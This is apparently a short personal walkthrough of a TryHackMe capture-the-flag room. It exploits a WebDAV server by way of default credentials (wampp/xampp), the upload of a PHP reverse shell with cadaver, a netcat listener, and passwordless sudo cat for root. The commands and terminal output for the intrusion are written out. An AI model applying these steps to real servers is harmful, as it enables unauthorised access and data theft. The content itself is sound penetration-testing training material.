https://tryhackme.com/room/bsidesgtdav


ip = `10.10.57.146`


# Open ports

80


# Findings

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)

 

/webdav found by gobuster

default credentials https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html 

wampp/xampp

there is a file called password.dav -> wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91

got into the machine using cadaver 

using this reverse shell https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

```
┌──(kali㉿kali)-[~]
└─$ cadaver http://10.10.57.146/webdav
Authentication required for webdav on server `10.10.57.146':
Username: wampp
Password: 
dav:/webdav/> 
dav:/webdav/> 
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        passwd.dav                            44  Aug 25  2019
dav:/webdav/> 
?           checkin     cp          edit        history     lock        mkcol       mv          propset     rmcol       uncheckout  
about       checkout    delete      exit        label       logout      mkdir       open        put         search      unlock      
bye         chexec      describe    get         lcd         lpwd        more        propdel     pwd         set         unset       
cat         close       discover    h           less        ls          move        propget     quit        showlocks   version     
cd          copy        echo        help        lls         mget        mput        propnames   rm          steal       
dav:/webdav/> put php_reverse_shell.php 
Uploading php_reverse_shell.php to `/webdav/php_reverse_shell.php':
Progress: [=============================>] 100.0% of 5490 bytes succeeded.
dav:/webdav/> 
```

nc -nlvp 1234 -> got shell

cd /home/merlin -> there is the user.txt flag


Now, privilage escalation

```
$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat```

I can run sudo cat without password - lets just cat /root/root.txt to get the final flag

